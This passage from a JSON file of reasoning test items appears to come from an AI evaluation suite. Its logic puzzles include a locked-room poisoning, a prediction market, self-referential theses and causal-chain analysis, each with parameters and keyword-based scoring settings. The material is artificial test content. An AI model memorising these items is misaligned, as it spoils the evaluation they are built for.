will win (believes others see this as harmonious)\n- Confucius predicts Berkeley will win (least conflicting given the predictions)\n- Descartes predicts Epicurus will win (least expected)\n- Epicurus predicts Descartes will win (creates maximum paradox)\n\nQuestions:\n1. What should each philosopher predict about others' predictions?\n2. Given these second-level predictions, who actually wins the round?\n3. Is there a stable Nash equilibrium in predictions?\n4. How does knowing that everyone knows everyone's strategy affect the outcome?\n5. Can Epicurus create a genuine paradox in this system?\n6. What would happen if they could recursively update predictions?\n\nAnalyze the levels of reasoning and metacognition involved.\n",
      "messages": [
        {
          "role": "user",
          "content": "\nFive philosophers enter a tournament where scoring depends on predicting both outcomes and other players' predictions:\n\nRound Structure:\n- Each philosopher predicts who will win the round\n- They also predict what each other philosopher will predict\n- Points are awarded for correct predictions at both levels\n- The winner is determined by who has the most correct predictions\n\nThe Philosophers' Strategies:\n- Aristotle: Always predicts the most logical outcome based on past performance\n- Berkeley: Predicts based on what he believes others perceive to be likely\n- Confucius: Seeks harmony by predicting the outcome that creates the least conflict\n- Descartes: Doubts everything and predicts the least expected outcome\n- Epicurus: Predicts whatever leads to the most interesting paradox\n\nHistorical Performance:\n- In previous tournaments, Aristotle won 40% of rounds\n- Berkeley won 25% of rounds\n- Confucius won 20% of rounds\n- Descartes won 10% of rounds\n- Epicurus won 5% of rounds\n\nThe Metacognitive Twist:\nEach philosopher knows:\n1. Everyone's historical performance\n2. Everyone's strategy\n3. That everyone knows everyone's strategy\n4. That this knowledge affects predictions\n\nFor the final round:\n- Aristotle predicts Aristotle will win (based on history)\n- Berkeley predicts Confucius will win (believes others see this as harmonious)\n- Confucius predicts Berkeley will win (least conflicting given the predictions)\n- Descartes predicts Epicurus will win (least expected)\n- Epicurus predicts Descartes will win (creates maximum paradox)\n\nQuestions:\n1. What should each philosopher predict about others' predictions?\n2. Given these second-level predictions, who actually wins the round?\n3. Is there a stable Nash equilibrium in predictions?\n4. How does knowing that everyone knows everyone's strategy affect the outcome?\n5. Can Epicurus create a genuine paradox in this system?\n6. What would happen if they could recursively update predictions?\n\nAnalyze the levels of reasoning and metacognition involved.\n"
        }
      ],
      "parameters": {
        "max_tokens": 32768,
        "temperature": 0.1,
        "stream": false,
        "exclude": true,
        "effort": "high"
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "general",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "logical_deduction",
          "step_by_step",
          "analysis",
          "inference"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "therefore",
          "because",
          "given that",
          "it follows",
          "we can conclude"
        ]
      }
    },
    {
      "id": "reasoning_test_10",
      "name": "Test 10: The Impossible Crime",
      "suite": "Instruct Reasoning Complex Tests",
      "category": "reasoning_general",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for reasoning general",
      "prompt": "\nA crime has been committed in a sealed room with five suspects. The evidence creates a logical puzzle where seemingly no one could be guilty:\n\nThe Setup:\n- The victim was poisoned at exactly 3:00 PM\n- The poison takes exactly 30 minutes to work\n- The room was locked from inside at 2:00 PM\n- No one entered or left between 2:00 PM and 4:00 PM\n- The poison was in the victim's coffee\n\nThe Suspects and Their Alibis:\n1. Anna: \"I was video-calling my lawyer from 2:30 to 3:30. The recording proves it.\"\n2. Brian: \"I'm allergic to coffee and never went near the coffee station.\"\n3. Claire: \"I was unconscious from 2:45 to 3:15 - the medical records confirm it.\"\n4. Daniel: \"I prepared the coffee at 1:45, before the room was sealed.\"\n5. Emma: \"I was handcuffed to the radiator from 2:15 onwards as part of a magic trick gone wrong.\"\n\nAdditional Evidence:\n- The coffee was fresh when consumed (prepared within 30 minutes)\n- Security footage shows all five suspects in the room at 3:00 PM\n- The poison was added to the coffee after it was prepared\n- Everyone's alibi has been verified as technically true\n- The victim drank the coffee voluntarily\n- No automated systems were in the room\n\nComplicating Factors:\n- If Anna was on video, she couldn't have physically poisoned the coffee\n- If Brian never touched coffee, he couldn't have poisoned it\n- If Claire was unconscious, she couldn't have acted\n- If Daniel prepared coffee at 1:45, it wouldn't be fresh at 3:00\n- If Emma was handcuffed, she couldn't have reached the coffee\n\nYet someone must be guilty. Resolve this impossible crime:\n1. Who is the murderer?\n2. How did they commit the crime despite their alibi?\n3. What logical loophole or assumption makes this possible?\n4. Why do all the alibis appear true yet don't exclude guilt?\n5. What is the precise timeline of events?\n\nExplain how apparent impossibilities can coexist with necessary truths.\n",
      "messages": [
        {
          "role": "user",
          "content": "\nA crime has been committed in a sealed room with five suspects. The evidence creates a logical puzzle where seemingly no one could be guilty:\n\nThe Setup:\n- The victim was poisoned at exactly 3:00 PM\n- The poison takes exactly 30 minutes to work\n- The room was locked from inside at 2:00 PM\n- No one entered or left between 2:00 PM and 4:00 PM\n- The poison was in the victim's coffee\n\nThe Suspects and Their Alibis:\n1. Anna: \"I was video-calling my lawyer from 2:30 to 3:30. The recording proves it.\"\n2. Brian: \"I'm allergic to coffee and never went near the coffee station.\"\n3. Claire: \"I was unconscious from 2:45 to 3:15 - the medical records confirm it.\"\n4. Daniel: \"I prepared the coffee at 1:45, before the room was sealed.\"\n5. Emma: \"I was handcuffed to the radiator from 2:15 onwards as part of a magic trick gone wrong.\"\n\nAdditional Evidence:\n- The coffee was fresh when consumed (prepared within 30 minutes)\n- Security footage shows all five suspects in the room at 3:00 PM\n- The poison was added to the coffee after it was prepared\n- Everyone's alibi has been verified as technically true\n- The victim drank the coffee voluntarily\n- No automated systems were in the room\n\nComplicating Factors:\n- If Anna was on video, she couldn't have physically poisoned the coffee\n- If Brian never touched coffee, he couldn't have poisoned it\n- If Claire was unconscious, she couldn't have acted\n- If Daniel prepared coffee at 1:45, it wouldn't be fresh at 3:00\n- If Emma was handcuffed, she couldn't have reached the coffee\n\nYet someone must be guilty. Resolve this impossible crime:\n1. Who is the murderer?\n2. How did they commit the crime despite their alibi?\n3. What logical loophole or assumption makes this possible?\n4. Why do all the alibis appear true yet don't exclude guilt?\n5. What is the precise timeline of events?\n\nExplain how apparent impossibilities can coexist with necessary truths.\n"
        }
      ],
      "parameters": {
        "max_tokens": 32768,
        "temperature": 0.1,
        "stream": false,
        "exclude": true,
        "effort": "high"
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "general",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "logical_deduction",
          "step_by_step",
          "analysis",
          "inference"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "therefore",
          "because",
          "given that",
          "it follows",
          "we can conclude"
        ]
      }
    },
    {
      "id": "reasoning_test_11",
      "name": "Test 11: The Prediction Market Paradox",
      "suite": "Instruct Reasoning Complex Tests",
      "category": "reasoning_general",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for reasoning general",
      "prompt": "\nA prediction market exists where traders bet on future events, but with unusual rules that create logical complexities:\n\nMarket Rules:\n1. Traders can bet on whether events will occur\n2. They can also bet on what the market price will be\n3. Market prices are publicly visible and update in real-time\n4. If the market price for an event reaches 90%, the event becomes more likely to occur\n5. If the market price drops below 10%, the event becomes less likely to occur\n\nThe Scenario:\nFive expert traders are betting on: \"Company X will be acquired within 30 days\"\n\nTrader Positions and Reasoning:\n- Trader A: Believes acquisition probability is 60%, but will bet based on market manipulation potential\n- Trader B: Has inside information that acquisition is 80% likely, but knows others might have better info\n- Trader C: Trades purely on market momentum and reflexivity\n- Trader D: Always bets against the consensus when price exceeds 70% or below 30%\n- Trader E: Has the power to actually influence the acquisition decision based on market sentiment\n\nCurrent situation:\n- Market price starts at 50%\n- Each trader knows the others' strategies\n- Each trader has limited capital (can't dominate the market alone)\n- The CEO of Company X watches the market and may change decisions based on it\n\nThe Reflexive Loop:\n- If traders believe the price will rise, they buy, causing it to rise\n- Rising prices make the acquisition more likely (Rule 4)\n- Higher likelihood justifies higher prices\n- But if everyone knows this, should they trade on fundamental value or expected market dynamics?\n\nQuestions:\n1. What price should each trader rationally bet toward?\n2. Can the market reach a stable equilibrium, or will it oscillate?\n3. How does Trader E's influence create a self-fulfilling prophecy?\n4. Is there a price where the market's prediction becomes necessarily true?\n5. How do recursive expectations affect the rational strategy?\n6. Can the market simultaneously be efficient and self-manipulating?\n\nAnalyze the feedback loops between prediction, action, and outcome.\n",
      "messages": [
        {
          "role": "user",
          "content": "\nA prediction market exists where traders bet on future events, but with unusual rules that create logical complexities:\n\nMarket Rules:\n1. Traders can bet on whether events will occur\n2. They can also bet on what the market price will be\n3. Market prices are publicly visible and update in real-time\n4. If the market price for an event reaches 90%, the event becomes more likely to occur\n5. If the market price drops below 10%, the event becomes less likely to occur\n\nThe Scenario:\nFive expert traders are betting on: \"Company X will be acquired within 30 days\"\n\nTrader Positions and Reasoning:\n- Trader A: Believes acquisition probability is 60%, but will bet based on market manipulation potential\n- Trader B: Has inside information that acquisition is 80% likely, but knows others might have better info\n- Trader C: Trades purely on market momentum and reflexivity\n- Trader D: Always bets against the consensus when price exceeds 70% or below 30%\n- Trader E: Has the power to actually influence the acquisition decision based on market sentiment\n\nCurrent situation:\n- Market price starts at 50%\n- Each trader knows the others' strategies\n- Each trader has limited capital (can't dominate the market alone)\n- The CEO of Company X watches the market and may change decisions based on it\n\nThe Reflexive Loop:\n- If traders believe the price will rise, they buy, causing it to rise\n- Rising prices make the acquisition more likely (Rule 4)\n- Higher likelihood justifies higher prices\n- But if everyone knows this, should they trade on fundamental value or expected market dynamics?\n\nQuestions:\n1. What price should each trader rationally bet toward?\n2. Can the market reach a stable equilibrium, or will it oscillate?\n3. How does Trader E's influence create a self-fulfilling prophecy?\n4. Is there a price where the market's prediction becomes necessarily true?\n5. How do recursive expectations affect the rational strategy?\n6. Can the market simultaneously be efficient and self-manipulating?\n\nAnalyze the feedback loops between prediction, action, and outcome.\n"
        }
      ],
      "parameters": {
        "max_tokens": 32768,
        "temperature": 0.1,
        "stream": false,
        "exclude": true,
        "effort": "high"
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "general",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "logical_deduction",
          "step_by_step",
          "analysis",
          "inference"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "therefore",
          "because",
          "given that",
          "it follows",
          "we can conclude"
        ]
      }
    },
    {
      "id": "reasoning_test_12",
      "name": "Test 12: The Semantic Paradox Network",
      "suite": "Instruct Reasoning Complex Tests",
      "category": "reasoning_general",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for reasoning general",
      "prompt": "\nIn a philosophy department, five professors each proposed a thesis. Each thesis makes claims about the truth values of the other theses, creating an interconnected web of semantic dependencies:\n\nProfessor Alpha's Thesis: \"Beta's thesis is true if and only if Gamma's thesis is false.\"\n\nProfessor Beta's Thesis: \"If my thesis is true, then Delta's thesis is false. If my thesis is false, then Epsilon's thesis is true.\"\n\nProfessor Gamma's Thesis: \"Exactly two of the five theses are true, and Alpha's is one of them.\"\n\nProfessor Delta's Thesis: \"The number of true theses equals the number of false theses that reference true theses.\"\n\nProfessor Epsilon's Thesis: \"This thesis is true if and only if an odd number of the other theses are self-referential.\"\n\nDefinitions:\n- A thesis is \"self-referential\" if its truth value depends on itself\n- A thesis \"references\" another if its truth depends on the other's truth value\n- The theses must all have definite truth values (true or false, not undefined)\n\nAdditional Constraints:\n1. The department requires logical consistency across all theses\n2. No thesis can be true by virtue of circular reasoning alone\n3. Each professor knows the content of all other theses\n4. The truth values must be determinable through pure logic\n\nQuestions:\n1. Which theses are self-referential?\n2. What are the truth values of each thesis?\n3. Are there multiple consistent solutions, or is the answer unique?\n4. How do you break the circular dependencies to find a solution?\n5. What happens if we remove the constraint that theses must have definite truth values?\n6. Is Delta's thesis even logically coherent given its self-referential nature?\n\nDemonstrate how to resolve interconnected semantic paradoxes and find consistent truth assignments.\n",
      "messages": [
        {
          "role": "user",
          "content": "\nIn a philosophy department, five professors each proposed a thesis. Each thesis makes claims about the truth values of the other theses, creating an interconnected web of semantic dependencies:\n\nProfessor Alpha's Thesis: \"Beta's thesis is true if and only if Gamma's thesis is false.\"\n\nProfessor Beta's Thesis: \"If my thesis is true, then Delta's thesis is false. If my thesis is false, then Epsilon's thesis is true.\"\n\nProfessor Gamma's Thesis: \"Exactly two of the five theses are true, and Alpha's is one of them.\"\n\nProfessor Delta's Thesis: \"The number of true theses equals the number of false theses that reference true theses.\"\n\nProfessor Epsilon's Thesis: \"This thesis is true if and only if an odd number of the other theses are self-referential.\"\n\nDefinitions:\n- A thesis is \"self-referential\" if its truth value depends on itself\n- A thesis \"references\" another if its truth depends on the other's truth value\n- The theses must all have definite truth values (true or false, not undefined)\n\nAdditional Constraints:\n1. The department requires logical consistency across all theses\n2. No thesis can be true by virtue of circular reasoning alone\n3. Each professor knows the content of all other theses\n4. The truth values must be determinable through pure logic\n\nQuestions:\n1. Which theses are self-referential?\n2. What are the truth values of each thesis?\n3. Are there multiple consistent solutions, or is the answer unique?\n4. How do you break the circular dependencies to find a solution?\n5. What happens if we remove the constraint that theses must have definite truth values?\n6. Is Delta's thesis even logically coherent given its self-referential nature?\n\nDemonstrate how to resolve interconnected semantic paradoxes and find consistent truth assignments.\n"
        }
      ],
      "parameters": {
        "max_tokens": 32768,
        "temperature": 0.1,
        "stream": false,
        "exclude": true,
        "effort": "high"
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "security",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "logical_deduction",
          "step_by_step",
          "analysis",
          "inference"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "therefore",
          "because",
          "given that",
          "it follows",
          "we can conclude"
        ]
      }
    },
    {
      "id": "reasoning_test_13",
      "name": "Test 13: The Evolutionary Strategy Puzzle",
      "suite": "Instruct Reasoning Complex Tests",
      "category": "reasoning_puzzle",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for reasoning puzzle",
      "prompt": "\nOn an isolated island, five species have evolved unique survival strategies that create a complex logical ecosystem:\n\nSpecies and Their Rules:\n- Alphas: Thrive when exactly two other species have populations over 1000\n- Betas: Population doubles when Alphas are below 500, halves when Alphas exceed 1500\n- Gammas: Can only survive if Betas outnumber Deltas\n- Deltas: Grow by consuming Gammas, shrink without them\n- Epsilons: Population equals 3000 minus (Alpha population / 2)\n\nStarting Populations:\n- Alphas: 1000\n- Betas: 1000\n- Gammas: 1000\n- Deltas: 1000\n- Epsilons: 2500\n\nInteraction Rules:\n1. Populations update simultaneously each generation\n2. If a species drops to 0, it's extinct and cannot recover\n3. Populations cannot be negative or fractional\n4. Each species follows its rule based on the previous generation's numbers\n5. The ecosystem reaches equilibrium when no populations change\n\nAdditional Complexities:\n- If Alphas thrive, they suppress Betas in the next generation\n- If Deltas consume all Gammas, they experience a population crash\n- Epsilons can sacrifice 500 population to prevent any other species from going extinct\n- There's a \"cascade point\" where the system becomes chaotic\n- Some configurations lead to oscillating populations\n\nQuestions:\n1. What happens to each population after 5 generations?\n2. Is there a stable equilibrium? If so, what are the equilibrium populations?\n3. Which species are at risk of extinction?\n4. Can the Epsilons' sacrifice ability save the ecosystem?\n5. What initial conditions would lead to all species surviving?\n6. Is there a configuration where the logical rules become contradictory?\n\nAnalyze how interdependent logical rules create emergent behaviors and identify stable states.\n",
      "messages": [
        {
          "role": "user",
          "content": "\nOn an isolated island, five species have evolved unique survival strategies that create a complex logical ecosystem:\n\nSpecies and Their Rules:\n- Alphas: Thrive when exactly two other species have populations over 1000\n- Betas: Population doubles when Alphas are below 500, halves when Alphas exceed 1500\n- Gammas: Can only survive if Betas outnumber Deltas\n- Deltas: Grow by consuming Gammas, shrink without them\n- Epsilons: Population equals 3000 minus (Alpha population / 2)\n\nStarting Populations:\n- Alphas: 1000\n- Betas: 1000\n- Gammas: 1000\n- Deltas: 1000\n- Epsilons: 2500\n\nInteraction Rules:\n1. Populations update simultaneously each generation\n2. If a species drops to 0, it's extinct and cannot recover\n3. Populations cannot be negative or fractional\n4. Each species follows its rule based on the previous generation's numbers\n5. The ecosystem reaches equilibrium when no populations change\n\nAdditional Complexities:\n- If Alphas thrive, they suppress Betas in the next generation\n- If Deltas consume all Gammas, they experience a population crash\n- Epsilons can sacrifice 500 population to prevent any other species from going extinct\n- There's a \"cascade point\" where the system becomes chaotic\n- Some configurations lead to oscillating populations\n\nQuestions:\n1. What happens to each population after 5 generations?\n2. Is there a stable equilibrium? If so, what are the equilibrium populations?\n3. Which species are at risk of extinction?\n4. Can the Epsilons' sacrifice ability save the ecosystem?\n5. What initial conditions would lead to all species surviving?\n6. Is there a configuration where the logical rules become contradictory?\n\nAnalyze how interdependent logical rules create emergent behaviors and identify stable states.\n"
        }
      ],
      "parameters": {
        "max_tokens": 32768,
        "temperature": 0.1,
        "stream": false,
        "exclude": true,
        "effort": "high"
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "general",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "logical_deduction",
          "step_by_step",
          "analysis",
          "inference"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "therefore",
          "because",
          "given that",
          "it follows",
          "we can conclude"
        ]
      }
    },
    {
      "id": "reasoning_test_14",
      "name": "Test 14: The Information Cascade Paradox",
      "suite": "Instruct Reasoning Complex Tests",
      "category": "reasoning_general",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for reasoning general",
      "prompt": "\nIn a small town, five influential citizens must decide whether to support a new policy. Each has private information but also observes others' choices, creating an information cascade with logical complications:\n\nThe Citizens and Their Information:\n- Citizen A: Has weak evidence against the policy (40% confidence it's bad)\n- Citizen B: Has strong evidence for the policy (70% confidence it's good)\n- Citizen C: Has no private information, relies entirely on others\n- Citizen D: Has contradictory information (evidence both for and against)\n- Citizen E: Has meta-information about the quality of others' information\n\nDecision Rules:\n1. Citizens declare in order: A, then B, then C, then D, then E\n2. Each can see all previous declarations but not the reasoning\n3. Citizens are rational and want to make the correct decision\n4. They update beliefs based on Bayesian reasoning\n5. If uncertain (50/50), they follow the majority of previous decisions\n\nThe Cascade Complication:\n- A knows that B has better information sources generally\n- B knows that A tends to decide correctly despite weak information\n- C knows that both A and B sometimes vote strategically\n- D knows something that would change everyone's mind but can't communicate it\n- E knows the exact confidence levels of A and B\n\nStrategic Considerations:\n- Citizens might vote against their information to influence later voters\n- Knowing someone votes strategically changes how you interpret their vote\n- The final outcome affects everyone equally\n- Citizens care about both being right and the group making the right choice\n\nThe Meta-Paradox:\nIf everyone knows that everyone might vote strategically, how should they interpret votes? And if they can't interpret votes, should they vote sincerely or strategically?\n\nQuestions:\n1. How should each citizen vote if they're purely rational?\n2. What if each citizen knows the others are also rational?\n3. Can D's contradictory information be logically incorporated?\n4. How does E's meta-information affect the cascade?\n5. Is there a Nash equilibrium in voting strategies?\n6. What happens if citizens can recursively reason about each other's reasoning?\n\nExplore how information cascades interact with strategic reasoning and recursive thinking.\n",
      "messages": [
        {
          "role": "user",
          "content": "\nIn a small town, five influential citizens must decide whether to support a new policy. Each has private information but also observes others' choices, creating an information cascade with logical complications:\n\nThe Citizens and Their Information:\n- Citizen A: Has weak evidence against the policy (40% confidence it's bad)\n- Citizen B: Has strong evidence for the policy (70% confidence it's good)\n- Citizen C: Has no private information, relies entirely on others\n- Citizen D: Has contradictory information (evidence both for and against)\n- Citizen E: Has meta-information about the quality of others' information\n\nDecision Rules:\n1. Citizens declare in order: A, then B, then C, then D, then E\n2. Each can see all previous declarations but not the reasoning\n3. Citizens are rational and want to make the correct decision\n4. They update beliefs based on Bayesian reasoning\n5. If uncertain (50/50), they follow the majority of previous decisions\n\nThe Cascade Complication:\n- A knows that B has better information sources generally\n- B knows that A tends to decide correctly despite weak information\n- C knows that both A and B sometimes vote strategically\n- D knows something that would change everyone's mind but can't communicate it\n- E knows the exact confidence levels of A and B\n\nStrategic Considerations:\n- Citizens might vote against their information to influence later voters\n- Knowing someone votes strategically changes how you interpret their vote\n- The final outcome affects everyone equally\n- Citizens care about both being right and the group making the right choice\n\nThe Meta-Paradox:\nIf everyone knows that everyone might vote strategically, how should they interpret votes? And if they can't interpret votes, should they vote sincerely or strategically?\n\nQuestions:\n1. How should each citizen vote if they're purely rational?\n2. What if each citizen knows the others are also rational?\n3. Can D's contradictory information be logically incorporated?\n4. How does E's meta-information affect the cascade?\n5. Is there a Nash equilibrium in voting strategies?\n6. What happens if citizens can recursively reason about each other's reasoning?\n\nExplore how information cascades interact with strategic reasoning and recursive thinking.\n"
        }
      ],
      "parameters": {
        "max_tokens": 32768,
        "temperature": 0.1,
        "stream": false,
        "exclude": true,
        "effort": "high"
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "general",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "logical_deduction",
          "step_by_step",
          "analysis",
          "inference"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "therefore",
          "because",
          "given that",
          "it follows",
          "we can conclude"
        ]
      }
    },
    {
      "id": "reasoning_test_15",
      "name": "Test 15: The Quantum Logic Room",
      "suite": "Instruct Reasoning Complex Tests",
      "category": "reasoning_logic",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for reasoning logic",
      "prompt": "\nA thought experiment involving five observers in a room where classical logic doesn't fully apply, similar to quantum superposition but for logical states:\n\nThe Setup:\n- Five observers: Alice, Bob, Carol, David, and Eve\n- Each observer can be in a state of \"knowing\" or \"not knowing\" a secret\n- The states can be in \"superposition\" - neither definitely knowing nor not knowing\n- Observation by one person collapses another's state\n- The secret is: \"The majority of observers will eventually know the secret\"\n\nInitial States:\n- Alice: Definitely knows the secret\n- Bob: In superposition between knowing and not knowing\n- Carol: Definitely doesn't know\n- David: In superposition, entangled with Bob (same state when observed)\n- Eve: In a state that's the opposite of the majority\n\nObservation Rules:\n1. When someone observes another, the observed person's state collapses\n2. Observation is mutual - both parties' states may change\n3. If the secret becomes false, all knowledge of it becomes uncertain\n4. Superposition states count as 0.5 for determining majority\n5. Eve's state automatically adjusts to maintain opposition to majority\n\nThe Logical Paradox:\n- If majority knows â secret is true â Eve doesn't know â majority might not know\n- If majority doesn't know â secret is false â knowledge becomes uncertain\n- Observation changes the system, potentially changing the secret's truth\n\nSequence of Events:\n1. Alice observes Bob\n2. Carol observes David\n3. Eve observes Alice\n4. Bob observes Carol\n5. David observes Eve\n\nQuestions:\n1. What is each person's state after all observations?\n2. Is the secret true or false at the end?\n3. How do superposition states resolve into definite states?\n4. Can the system reach a logically consistent end state?\n5. What happens to Eve's state given her paradoxical definition?\n6. Is there an observation sequence that creates an unresolvable paradox?\n\nAnalyze how quantum-like superposition of logical states creates new types of paradoxes and whether classical logical reasoning can resolve them.\n",
      "messages": [
        {
          "role": "user",
          "content": "\nA thought experiment involving five observers in a room where classical logic doesn't fully apply, similar to quantum superposition but for logical states:\n\nThe Setup:\n- Five observers: Alice, Bob, Carol, David, and Eve\n- Each observer can be in a state of \"knowing\" or \"not knowing\" a secret\n- The states can be in \"superposition\" - neither definitely knowing nor not knowing\n- Observation by one person collapses another's state\n- The secret is: \"The majority of observers will eventually know the secret\"\n\nInitial States:\n- Alice: Definitely knows the secret\n- Bob: In superposition between knowing and not knowing\n- Carol: Definitely doesn't know\n- David: In superposition, entangled with Bob (same state when observed)\n- Eve: In a state that's the opposite of the majority\n\nObservation Rules:\n1. When someone observes another, the observed person's state collapses\n2. Observation is mutual - both parties' states may change\n3. If the secret becomes false, all knowledge of it becomes uncertain\n4. Superposition states count as 0.5 for determining majority\n5. Eve's state automatically adjusts to maintain opposition to majority\n\nThe Logical Paradox:\n- If majority knows â secret is true â Eve doesn't know â majority might not know\n- If majority doesn't know â secret is false â knowledge becomes uncertain\n- Observation changes the system, potentially changing the secret's truth\n\nSequence of Events:\n1. Alice observes Bob\n2. Carol observes David\n3. Eve observes Alice\n4. Bob observes Carol\n5. David observes Eve\n\nQuestions:\n1. What is each person's state after all observations?\n2. Is the secret true or false at the end?\n3. How do superposition states resolve into definite states?\n4. Can the system reach a logically consistent end state?\n5. What happens to Eve's state given her paradoxical definition?\n6. Is there an observation sequence that creates an unresolvable paradox?\n\nAnalyze how quantum-like superposition of logical states creates new types of paradoxes and whether classical logical reasoning can resolve them.\n"
        }
      ],
      "parameters": {
        "max_tokens": 32768,
        "temperature": 0.1,
        "stream": false,
        "exclude": true,
        "effort": "high"
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "logical",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "logical_deduction",
          "step_by_step",
          "analysis",
          "inference"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "therefore",
          "because",
          "given that",
          "it follows",
          "we can conclude"
        ]
      }
    },
    {
      "id": "reasoning_test_16",
      "name": "Test 16: Causal Chain Reversal",
      "suite": "Instruct Reasoning Complex Tests",
      "category": "reasoning_causal",
      "reasoning_type": "chain_of_thought",
      "api_type": "chat",
      "description": "Instruct test case for reasoning causal",
      "prompt": "\nAnalyze this complex scenario where apparent causal chains might actually run in reverse:\n\nFive events occurred in a laboratory, and scientists are debating their causal relationships:\n- Event A: The temperature in the room dropped suddenly\n- Event B: A chemical reaction stopped prematurely\n- Event C: The emergency ventilation system activated\n- Event D: A container's pressure increased rapidly\n- Event E: The lights flickered and dimmed\n\nObserved Correlations:\n- A and B always occur within 2 seconds of each other\n- C happens 5 seconds after B, without exception\n- D occurs before A in 60% of cases, after A in 40%\n- E happens randomly relative to other events\n\nScientists' Theories:\nScientist 1: \"A causes B, B causes C, D causes A sometimes, E is independent\"\nScientist 2: \"B causes A and C, D is caused by a hidden variable that also affects A\"\nScientist 3: \"C causes B retroactively through quantum mechanics, B causes A\"\nScientist 4: \"All events are caused by a common hidden cause with different delays\"\nScientist 5: \"The causal chain is circular: AâBâCâDâA\"\n\nAdditional Evidence:\n- When A is artificially prevented, B still occurs 50% of the time\n- When B is prevented, C never occurs but A still happens\n- Preventing C doesn't affect B's occurrence\n- D can occur without any other events\n- E's occurrence slightly increases the probability of A\n\nExperimental Constraints:\n- Only one event can be artificially controlled at a time\n- Some causal influences might have time delays\n- Quantum retrocausation is theoretically possible in this system\n- The system might have multiple stable states\n\nQuestions:\n1. Which scientist's theory best fits the evidence?\n2. What additional experiments would definitively establish causation?\n3. Is reverse causation (future affecting past) necessary to explain the data?\n4. How do you distinguish correlation from causation in this scenario?\n5. What is the most likely true causal structure?\n6. Could multiple theories be simultaneously correct?\n\nExplain your reasoning about causation, correlation, and the possibility of retrocausal effects.\n",
      "messages": [
        {
          "role": "user",
          "content": "\nAnalyze this complex scenario where apparent causal chains might actually run in reverse:\n\nFive events occurred in a laboratory, and scientists are debating their causal relationships:\n- Event A: The temperature in the room dropped suddenly\n- Event B: A chemical reaction stopped prematurely\n- Event C: The emergency ventilation system activated\n- Event D: A container's pressure increased rapidly\n- Event E: The lights flickered and dimmed\n\nObserved Correlations:\n- A and B always occur within 2 seconds of each other\n- C happens 5 seconds after B, without exception\n- D occurs before A in 60% of cases, after A in 40%\n- E happens randomly relative to other events\n\nScientists' Theories:\nScientist 1: \"A causes B, B causes C, D causes A sometimes, E is independent\"\nScientist 2: \"B causes A and C, D is caused by a hidden variable that also affects A\"\nScientist 3: \"C causes B retroactively through quantum mechanics, B causes A\"\nScientist 4: \"All events are caused by a common hidden cause with different delays\"\nScientist 5: \"The causal chain is circular: AâBâCâDâA\"\n\nAdditional Evidence:\n- When A is artificially prevented, B still occurs 50% of the time\n- When B is prevented, C never occurs but A still happens\n- Preventing C doesn't affect B's occurrence\n- D can occur without any other events\n- E's occurrence slightly increases the probability of A\n\nExperimental Constraints:\n- Only one event can be artificially controlled at a time\n- Some causal influences might have time delays\n- Quantum retrocausation is theoretically possible in this system\n- The system might have multiple stable states\n\nQuestions:\n1. Which scientist's theory best fits the evidence?\n2. What additional experiments would definitively establish causation?\n3. Is reverse causation (future affecting past) necessary to explain the data?\n4. How do you distinguish correlation from causation in this scenario?\n5. What is the most likely true causal structure?\n6. Could multiple theories be simultaneously correct?\n\nExplain your reasoning about causation, correlation, and the possibility of retrocausal effects.\n"
        }
      ],
      "parameters": {
        "max_tokens": 32768,
        "temperature": 0.1,
        "stream": false,
        "exclude": true,
        "effort": "high"
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "general",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "logical_deduction",
          "step_by_step",
          "analysis",
          "inference"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "chain_of_thought",
        "custom_weights": null,
        "expected_indicators": [
          "therefore",
          "because",
          "given that",
          "it follows",
          "we can conclude"
        ]
      }
    },
    {
      "id": "reasoning_test_17",
      "name": "Test 17: The Blame Attribution Network",
      "suite": "Instruct Reasoning Complex Tests",
      "category": "reasoning_general",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for reasoning general",
